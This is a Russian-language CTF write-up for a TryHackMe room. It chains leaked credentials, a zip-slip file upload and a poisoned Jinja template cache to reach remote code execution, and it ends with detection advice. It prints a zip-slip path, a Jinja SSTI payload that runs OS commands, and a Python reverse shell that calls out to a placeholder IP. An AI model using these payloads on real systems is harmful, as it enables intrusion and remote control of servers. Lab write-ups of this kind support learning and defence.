# The Hollow Shell: zip-slip + отравленный Jinja-шаблон

**Машина:** [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac) (medium, Hacker Holidays 2026, Day 10)
**Цепочка:** креды из HTML-комментария → загрузка «shell»-пакетов (.zip) → zip-slip → перезапись кеша шаблонов → RCE.

## Вход

На 5000-м порту — портал с загрузкой «shell»-пакетов (zip с манифестом и ассетами для планшетов отеля). Креды для логина лежат в многострочном HTML-комментарии на `/login` — читаем исходник, а не брутим.

## Zip Slip

Распаковщик доверяет именам файлов в архиве. Классика:

```python
z.writestr("../../shells/<id>/p2.json", '{"slipped":true}')
```

Загружаем, проверяем `http://target:5000/shells/<id>/p2.json` — 200, запись за пределами директории подтверждена. Arbitrary write есть, осталось превратить в исполнение.

## Отравленный шаблон

Приложение на Flask/Jinja, шаблоны кешируются. Вместо того чтобы искать hooks (они оказались ложным следом — поле `"hooks": []` в манифесте выглядело соблазнительно, но никуда не вело), пишем через slip файл с Jinja-payload прямо в кеш шаблонов:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cmd').read() }}
```

Приложение рендерит кешированный шаблон — payload исполняется. В записи приведён вариант с реверс-шеллом:

```python
callback = '''
import socket,subprocess,os,pty
s=socket.socket(); s.connect(("IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''
```

## Как обнаружить

Для поиска Zip Slip стоит отслеживать запись за пределами каталога распаковки и изменения шаблонов вне деплоя. auditd при настроенных правилах помогает определить процесс, выполнивший запись; inotify уведомляет об изменении, но сам по себе не сообщает, кто его сделал. Проверка целостности шаблонов полезнее одного маркера: атакующий может сохранить маркер при подмене.

## Заметка

Здесь Zip Slip даёт перезапись файла, который приложение затем обрабатывает как доверенный шаблон. Поле `hooks` оказалось ложным следом; для RCE важен именно доступ на запись к шаблонам. Какие проверки allowlist были обойдены и что приложение называет кешем, в записи не уточняется.
